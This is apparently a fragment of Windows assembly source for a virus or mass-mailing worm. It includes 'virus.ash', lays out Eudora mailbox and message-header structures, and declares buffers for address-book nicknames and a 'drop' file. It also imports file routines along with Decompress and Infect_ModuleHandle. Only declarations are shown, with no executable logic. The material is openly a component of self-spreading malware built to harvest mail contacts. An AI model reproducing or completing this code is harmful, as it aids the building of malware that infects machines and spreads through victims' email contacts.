;======================(Directive Warez)=====================================

include virus.ash

;----------------------(Structure Warez)-------------------------------------

eudora_TocFile_Header	struc

			dq	?			; 00h
tochdr_MailBox_Name	db	8 dup(?)		; 08h
			db	18h dup(?)		; 10h
tochdr_MailBox_Type	dw	?			; 28h
			db	(66h - 2Ah) dup(?)	; 2Ah
tochdr_Message_Count	dw	?			; 66h
@tochdr_Size		db	?			; 68h			

eudora_TocFile_Header	ends
SetSize tochdr_Size

;-----------------------------------------------------
eudora_TocMsg_Header	struc

msghdr_MBX_FilePos	dd	?		; 00h
msghdr_MBX_Length	dd	?		; 04h
msghdr_DateTime		dd	?		; 08h
msghdr_Type		dw	?		; 0Ch
msghdr_Flags		dw	?		; 0Eh
msghdr_Priority		dw	?		; 10h
msghdr_azDateTime	db	20h dup(?)	; 12h
msghdr_azRecipient	db	40h dup(?)	; 32h
msghdr_azSubject	db	40h dup(?)	; 72h
			db	08h dup(?)	; 7Ah
msghdr_Label		dw	?		; 7Ch
			db	30  dup(?)	; 7Eh
@msghdr_Size		db	?		; DAh

eudora_TocMsg_Header	ends
SetSize msghdr_Size

;-----------------------(Stack Variables)-----------------------------------

sv0				struc

_Heap_Selector			dw	?
_TocFile_Handle                 dw	?
_MbxFile_Handle                 dw	?
_NickFile_Handle                dw	?
_DropFile_Handle		dw	?
_NickNames_Length               dw	? 
_Msg_Length			dw	?
_MsgHeader			db	msghdr_Size dup(?)
_TocHeader			db	tochdr_Size dup(?)
@stack_var_size			db	?

sv0				ends
SetSize	stack_var_size

StackVar	Heap_Selector
StackVar	TocFile_Handle
StackVar	MbxFile_Handle
StackVar	NickFile_Handle
StackVar	DropFile_Handle
StackVar	NickNames_Length
StackVar	Msg_Length
StackVar	MsgHeader
StackVar	TocHeader

;-----------------------(Heap Variables)-------------------------------------

hv0			struc

ConstructBuffer		db	4000h dup (?)	; LZSS hash table
NickNames		db	1600 dup(?)
MsgStart		db	300 dup(?)
MsgBuffer		db	1000h dup (?)
@heap_var_size		db	?

hv0			ends
SetSize heap_var_size

;-----------------------(Import Warez)---------------------------------------

extrn	a_LCREAT:PROC
extrn   a_LOPEN:PROC
extrn	a_LLSEEK:PROC
extrn	a_LREAD:PROC
extrn	a_LWRITE:PROC
extrn	a_LCLOSE:PROC
extrn	aGLOBALALLOC:PROC
extrn	aGLOBALLOCK:PROC
extrn	aGLOBALUNLOCK:PROC
extrn	aGLOBALFREE:PROC

extrn	Decompress:PROC
extrn	Infect_ModuleHandle:Proc

;============================================================================